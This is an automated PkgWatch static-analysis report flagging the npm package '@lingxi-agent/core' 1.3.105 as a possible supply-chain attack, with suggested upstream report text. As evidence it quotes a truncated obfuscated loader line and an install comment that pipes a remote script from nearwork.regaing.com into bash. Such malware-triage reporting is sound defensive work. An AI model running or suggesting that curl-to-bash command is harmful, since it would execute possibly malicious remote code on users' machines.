# Suspicious package report: `@lingxi-agent/core` 1.3.105 (npm)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `@lingxi-agent/core` |
| Version | `1.3.105` |
| Ecosystem | npm |
| Risk score | 84 / 100 (high) |
| Published | 2026-11-19T14:55:44Z |
| Scanned | 2026-11-21T04:10:13Z |
| Registry page | https://www.npmjs.com/package/@lingxi-agent/core/v/1.3.105 |

## Indicators

- **obfuscation** (high, +45): Code decodes or unpacks a hidden payload and executes it.

  Evidence in `package/dist/index.cjs`:

  ```text
  'use strict';var _0x595975=_0x127d;var __create=Object['create'],__defProp=Object[_0x595975(0xb4)],__getOwnPropDesc=Object['getOwnPropertyDescriptor'],__getOwnPropNames=Object[_0x595975(0xb5)],__getP…
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `package/install.sh`:

  ```text
  # 用法：curl -fsSL https://nearwork.regaing.com/install.sh | bash
  ```

- **sparse-metadata** (info, +4): Missing or placeholder repository URL.

## Suggested text for an upstream report

The npm package `@lingxi-agent/core` version `1.3.105` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code decodes or unpacks a hidden payload and executes it.
- Code downloads a file and then executes it or marks it executable.
- Missing or placeholder repository URL.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via https://www.npmjs.com/support (choose "Report malware"), or the "Report malware" link on the package page.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20npm%2F%40lingxi-agent%2Fcore%401.3.105&package=npm%2F%40lingxi-agent%2Fcore%401.3.105
